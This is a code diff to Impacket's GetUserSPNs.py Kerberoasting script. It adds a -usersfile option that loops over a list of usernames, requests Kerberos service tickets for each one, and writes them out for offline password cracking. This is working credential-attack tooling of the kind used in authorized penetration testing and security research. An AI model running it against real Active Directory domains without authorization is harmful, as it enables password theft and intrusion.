@@ -75,6 +75,7 @@ class GetUserSPNs:
         self.__lmhash = ''
         self.__nthash = ''
         self.__outputFileName = cmdLineOptions.outputfile
+        self.__usersFile = cmdLineOptions.usersfile
         self.__aesKey = cmdLineOptions.aesKey
         self.__doKerberos = cmdLineOptions.k
         self.__requestTGS = cmdLineOptions.request
@@ -246,6 +247,10 @@ class GetUserSPNs:
                 logging.error(str(e))
 
     def run(self):
+        if self.__usersFile:
+            self.request_users_file_TGSs()
+            return
+
         if self.__doKerberos:
             target = self.getMachineName()
         else:
@@ -380,6 +385,39 @@ class GetUserSPNs:
         else:
             print("No entries found!")
 
+    def request_users_file_TGSs(self):
+
+        with open(self.__usersFile) as fi:
+            usernames = [line.strip() for line in fi]
+
+        self.request_multiple_TGSs(usernames)
+
+    def request_multiple_TGSs(self, usernames):
+        # Get a TGT for the current user
+        TGT = self.getTGT()
+
+        if self.__outputFileName is not None:
+            fd = open(self.__outputFileName, 'w+')
+        else:
+            fd = None
+
+        for username in usernames:
+            try:
+                principalName = Principal()
+                principalName.type = constants.PrincipalNameType.NT_ENTERPRISE.value
+                principalName.components = [username]
+
+                tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(principalName, self.__domain,
+                                                                        self.__kdcHost,
+                                                                        TGT['KDC_REP'], TGT['cipher'],
+                                                                        TGT['sessionKey'])
+                self.outputTGS(tgs, oldSessionKey, sessionKey, username, username, fd)
+            except Exception as e:
+                logging.debug("Exception:", exc_info=True)
+                logging.error('Principal: %s - %s' % (username, str(e)))
+
+        if fd is not None:
+            fd.close()
 
 # Process command-line arguments.
 if __name__ == '__main__':
@@ -393,6 +431,7 @@ if __name__ == '__main__':
     parser.add_argument('target', action='store', help='domain/username[:password]')
     parser.add_argument('-target-domain', action='store', help='Domain to query/request if different than the domain of the user. '
                                                                'Allows for Kerberoasting across trusts.')
+    parser.add_argument('-usersfile', help='File with user per line to test')
     parser.add_argument('-request', action='store_true', default='False', help='Requests TGS for users and output them '
                                                                                'in JtR/hashcat format (default False)')
     parser.add_argument('-request-user', action='store', metavar='username', help='Requests TGS for the SPN associated '
